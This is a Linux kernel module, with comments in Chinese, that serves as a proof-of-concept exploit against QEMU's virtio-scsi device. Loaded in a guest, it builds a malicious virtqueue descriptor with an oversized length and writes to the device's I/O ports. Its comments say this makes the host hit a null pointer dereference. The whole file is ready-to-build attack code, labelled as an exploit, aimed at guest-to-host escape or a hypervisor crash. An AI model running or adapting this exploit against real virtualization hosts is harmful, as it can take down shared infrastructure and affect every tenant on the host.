#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <asm/io.h>

MODULE_LICENSE("GPL");

// [重要] 請務必先執行 lspci -v | grep "I/O ports" 確認地址
// 範例：如果看到 I/O ports at c040，則填 0xc040
#define VIRTIO_SCSI_IO 0xc040

#define VIRTIO_PCI_QUEUE_PFN 8
#define VIRTIO_PCI_QUEUE_SEL 14
#define VIRTIO_PCI_QUEUE_NOTIFY 16

// 簡化的 VirtIO SCSI 請求頭結構 (對應 QEMU 內部的 VirtIOSCSICmdReq)
struct virtio_scsi_cmd_req {
    u8 lun[8];     // 邏輯單元號
    u64 tag;       // 標籤
    u8 task_attr;  // 任務屬性
    u8 prio;       // 優先級
    u8 crn;        // 命令參考號
    u8 cdb[32];    // SCSI 命令描述塊 (Command Descriptor Block)
} __attribute__((packed));

struct vring_desc {
    u64 addr;
    u32 len;
    u16 flags;
    u16 next;
} __attribute__((packed));

struct vring_avail {
    u16 flags;
    u16 idx;
    u16 ring[0];
} __attribute__((packed));

void *mem_virt = NULL;
dma_addr_t mem_phys;

static int __init my_exploit_init(void)
{
    struct vring_desc *desc;
    struct vring_avail *avail;
    void *fake_buf;
    struct virtio_scsi_cmd_req *cmd_req;

    printk(KERN_INFO "[POC] Targeting Virtio-SCSI (Null Pointer Dereference)...\n");

    // 1. 分配 Virtqueue 記憶體
    mem_virt = kzalloc(0x3000, GFP_KERNEL);
    if (!mem_virt) {
        printk(KERN_ERR "Failed to alloc virtqueue memory\n");
        return -ENOMEM;
    }
    mem_phys = virt_to_phys(mem_virt);

    // 2. 分配請求緩衝區 (這將作為 SCSI Request Header)
    fake_buf = kzalloc(0x100, GFP_KERNEL);
    if (!fake_buf) {
        kfree(mem_virt);
        return -ENOMEM;
    }

    // [修正點] 填充 SCSI 指令，強制 QEMU 進行數據寫回
    cmd_req = (struct virtio_scsi_cmd_req *)fake_buf;
    
    // 設定 LUN (Logical Unit Number)，通常 LUN 0 或 1 是存在的
    // 這裡設為 1，與 PDF 範例保持一致
    cmd_req->lun[1] = 1; 
    
    // 設定 SCSI Command: INQUIRY (0x12)
    // 這是一個「讀取」指令，會讓 QEMU 把設備資訊寫回給 Guest
    // 這樣就能強迫 QEMU 去操作我們那個「有問題的」Desc 1
    cmd_req->cdb[0] = 0x12; // INQUIRY Opcode
    cmd_req->cdb[4] = 96;   // Allocation Length (告訴 QEMU 我們要讀多少字節)

    // 3. 設定 Virtqueue 指標
    desc = (struct vring_desc *)mem_virt;
    avail = (struct vring_avail *)(mem_virt + 0x800);

    // 4. 構造惡意描述符鏈
    
    // Desc 0: 請求頭 (Request Header - OUT)
    // 這是 Guest 寫給 QEMU 的指令
    desc[0].addr = virt_to_phys(fake_buf);
    desc[0].len = sizeof(struct virtio_scsi_cmd_req); // 正常長度
    desc[0].flags = 0x1; // VRING_DESC_F_NEXT (還有下一個)
    desc[0].next = 1;    // 指向 Desc 1

    // Desc 1: 響應/數據緩衝區 (Response/Data - IN)
    // 這是 QEMU 寫回給 Guest 的地方 -> 觸發漏洞的關鍵！
    desc[1].addr = virt_to_phys(fake_buf); // 指向同一個緩衝區沒關係
    desc[1].len = 0x44444444; // [關鍵漏洞點] 巨大的長度，導致 Host 端映射失敗返回 NULL
    desc[1].flags = 0x2;      // VRING_DESC_F_WRITE (QEMU 會寫入此處)
    desc[1].next = 0;

    // 5. 設定 Avail Ring
    avail->idx = 1;     // 告訴 QEMU 有 1 個請求準備好了
    avail->ring[0] = 0; // 請求從 desc[0] 開始

    // 6. 觸發 QEMU (IO Port 操作)
    printk(KERN_INFO "[POC] Kicking Queue 2 at IO Port 0x%x...\n", VIRTIO_SCSI_IO);
    
    // 選擇 Queue 2 (Request Queue)
    outw(2, VIRTIO_SCSI_IO + VIRTIO_PCI_QUEUE_SEL);
    
    // 告知 Virtqueue 的物理地址 (PFN)
    outl(mem_phys >> 12, VIRTIO_SCSI_IO + VIRTIO_PCI_QUEUE_PFN);
    
    // 踢一腳 (Notify)，通知 QEMU 幹活
    outw(2, VIRTIO_SCSI_IO + VIRTIO_PCI_QUEUE_NOTIFY);

    return 0;
}

static void __exit my_exploit_exit(void)
{
    if (mem_virt) kfree(mem_virt);
    printk(KERN_INFO "[POC] Module Unloaded\n");
}

module_init(my_exploit_init);
module_exit(my_exploit_exit);
